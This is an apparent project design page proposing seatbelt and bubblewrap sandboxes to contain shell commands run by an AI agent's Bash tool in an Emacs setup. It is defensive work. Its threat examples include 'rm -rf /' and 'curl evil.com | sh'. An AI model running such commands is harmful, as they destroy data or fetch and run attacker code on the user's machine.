---
title: platform-sandbox-strategy
status: active
category: security
tags: sandbox,seatbelt,bubblewrap,bwrap,macos,linux,platform
related: agent-architecture-patterns,gptel-sandbox,gptel-ext-security
depends-on: none
---

# Platform Sandbox Strategy: seatbelt (macOS) + bubblewrap (Linux)

Synthesized from direct experience and codebase review.

---

## Current State

OV5 uses Emacs-native sandboxing (`gptel-sandbox.el`) — expression whitelisting,
capability profiles, tool ACLs. This provides excellent containment for
LLM-generated **Lisp code** executed via the `Programmatic` tool.

However, when `Bash` tool is active (agent mode), actual shell processes run with
the daemon's full permissions. The Emacs-native sandbox cannot contain these.

---

## What We Got Wrong

Previous research (from Magent) classified seatbelt/bubblewrap as an
**anti-pattern** — "out of scope for our Emacs-native flow." This was
incorrect because:

1. Our flow **is not purely Emacs-native** when Bash is enabled
2. Agent mode allows arbitrary shell commands
3. Expression whitelisting alone cannot prevent `rm -rf /` or network exfiltration
   via shell

Direct experience (David Wu): **bubblewrap on Linux works well** for containing
Bash tool execution without breaking legitimate workflows.

---

## The Strategy

| Platform | Tool | Rationale |
|----------|------|-----------|
| **macOS** | `sandbox-exec` (seatbelt) | Built-in, no dependencies, Apple-maintained |
| **Linux** | `bubblewrap` (`bwrap`) | User-namespace containers, no root, widely available |

### macOS: seatbelt (`sandbox-exec`)

```bash
# Wrap any command in a seatbelt sandbox:
sandbox-exec -f profile.sb -- command args...

# Profile example (profile.sb):
(version 1)
(deny default)
(allow file-read* (subpath "/Users/davidwu/.emacs.d"))
(allow process-fork)
(allow sysctl-read)
```

Key properties:
- Built into macOS (no install needed)
- Kernel-level enforcement (trusted BSD layer)
- Profile-based: deny-by-default with explicit allows
- Restricts: filesystem access, network, process creation, syscalls

### Linux: bubblewrap (`bwrap`)

```bash
# Wrap any command in a bubblewrap container:
bwrap --ro-bind /usr /usr \
      --bind /tmp /tmp \
      --bind /home/user/project /home/user/project \
      --unshare-all \
      -- command args...
```

Key properties:
- User-namespace containers (no root/setuid needed)
- Available via package manager on all major distros
- `--unshare-all` isolates: network, PID, IPC, UTS, cgroup, user
- Bind-mount model: only specified paths visible

---

## Implementation Plan

### Phase 1: Platform Detection + Tool Wrapping

```elisp
(defun gptel-sandbox--platform-sandbox-command (cmd)
  "Wrap CMD in platform-appropriate sandbox."
  (cond
   ((eq system-type 'darwin)
    (let ((profile (gptel-sandbox--seatbelt-profile)))
      (format "sandbox-exec -f %s -- %s" profile cmd)))
   ((eq system-type 'gnu/linux)
    (let ((args (gptel-sandbox--bwrap-args)))
      (format "bwrap %s -- %s" args cmd)))
   (t cmd)))
```

### Phase 2: Profile Configuration

- **seatbelt profile**: Allow read/write to workspace root only. Deny network
  for plan mode. Allow network for agent mode (API calls needed).
- **bwrap args**: Bind workspace root, `/tmp`, `/usr`. Unshare network in plan
  mode.

### Phase 3: Integration Points

- `gptel-tools-bash.el` — wrap Bash execution
- `gptel-tools-programmatic.el` — wrap shell-based Programmatic calls
- `gptel-ext-security.el` — ACL integration

---

## Why Not Just Emacs-Native?

The Emacs-native sandbox (`gptel-sandbox.el`) and platform sandbox serve
**different layers** in defense-in-depth:

| Layer | Scope | What It Contains |
|-------|-------|-----------------|
| Tool Sanitize (`gptel-ext-tool-sanitize.el`) | Tool calls | Doom loops, inspection thrash, nil tools |
| Security ACL (`gptel-ext-security.el`) | Per-tool | Plan-mode Bash whitelist, workspace boundary |
| Expression Sandbox (`gptel-sandbox.el`) | Lisp code | Whitelisted forms, tool count, 15s timeout |
| **Platform Sandbox** (this page) | **OS processes** | **Filesystem access, network, syscalls** |

Platform sandbox is the **last line of defense** for actual shell execution.
Expression whitelisting simply cannot stop `curl evil.com | sh`.

---

## Anti-Pattern Correction

**Old**: "Avoid seatbelt/bubblewrap — out of scope for Emacs-native flow"
**New**: "Platform sandbox is the **missing layer**. Emacs-native is for Lisp
code; seatbelt/bubblewrap is for shell processes. Both are needed for
defense-in-depth when Bash tool is active."

---

*Synthesized from user experience + codebase review. Platform sandbox replaces
the Magent-derived anti-pattern classification with a concrete implementation
strategy.*
